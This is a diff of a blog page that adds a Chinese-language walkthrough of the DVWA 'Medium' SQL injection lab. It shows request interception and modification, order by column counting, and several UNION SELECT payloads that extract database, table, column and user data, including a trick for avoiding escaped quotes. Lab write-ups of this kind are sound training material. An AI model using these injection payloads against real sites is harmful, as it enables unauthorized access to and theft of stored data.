@@ -9,7 +9,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://lovectrl-tan.github.io/favicon.ico?v=1571993636863">
+<link rel="shortcut icon" href="https://lovectrl-tan.github.io/favicon.ico?v=1571996322108">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://lovectrl-tan.github.io/styles/main.css">
 
@@ -30,7 +30,7 @@
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://lovectrl-tan.github.io">
-        <img src="https://lovectrl-tan.github.io/images/avatar.png?v=1571993636863" class="site-logo">
+        <img src="https://lovectrl-tan.github.io/images/avatar.png?v=1571996322108" class="site-logo">
         <h1 class="site-title">LoveCtrl-Tan</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -131,6 +131,40 @@
 <img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025165321.png" alt=""></p>
 <!-- more -->
 <h1 id="medium">Medium</h1>
+<p>我们发现它变成了选项，这就意味着我们无法在这里进行注入啦<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025170659.png" alt=""><br>
+但是否真的无法进行注入了呢，我们尝试以下捉包<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025170853.png" alt=""><br>
+捉包成功，我们发现这里可以对参数进行修改，我们将它发送到Repeater里对它进行注入<br>
+现在我们进行注入判断<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025171217.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025171225.png" alt=""><br>
+现在我们来用<code>order by</code>语句判断字段数<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025171423.png" alt=""><br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025171431.png" alt=""><br>
+剩下的就是爆数据库名，表名和字段名</p>
+<pre><code>id=1 union select 1,database()#
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025171638.png" alt=""></figure>
+<pre><code>id=1 union select 1,(select table_name from information_schema.tables where table_schema='dvwa' limit 1,1)#
+</code></pre>
+<p>在这里，我们发现了一点小问题，我们发现我们的单行号<code>'</code>被自动加上啦一个反斜线转义<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025172632.png" alt=""><br>
+这种情况我们可以构造以下语句来进行查询</p>
+<pre><code>id=1 union select 1,(select table_name from information_schema.tables where table_schema=(database()) limit 1,1)#
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025172858.png" alt=""><br>
+返回成功，接着构造以下语句来查询字段名</p>
+<pre><code>id=1 union select 1,(select column_name from information_schema.columns where table_schema=(database()) and table_name=(select table_name from information_schema.tables where table_schema=(database()) limit 1,1) limit 0,1)#
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025173521.png" alt=""><br>
+接下来我们就可以查询数据啦</p>
+<pre><code>id=1 union select 1,(select user_id from dvwa.users limit 0,1)
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025173718.png" alt=""><br>
+网页源码<br>
+<img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191025173744.png" alt=""></p>
+<h1 id="high">High</h1>
 
             </div>
             
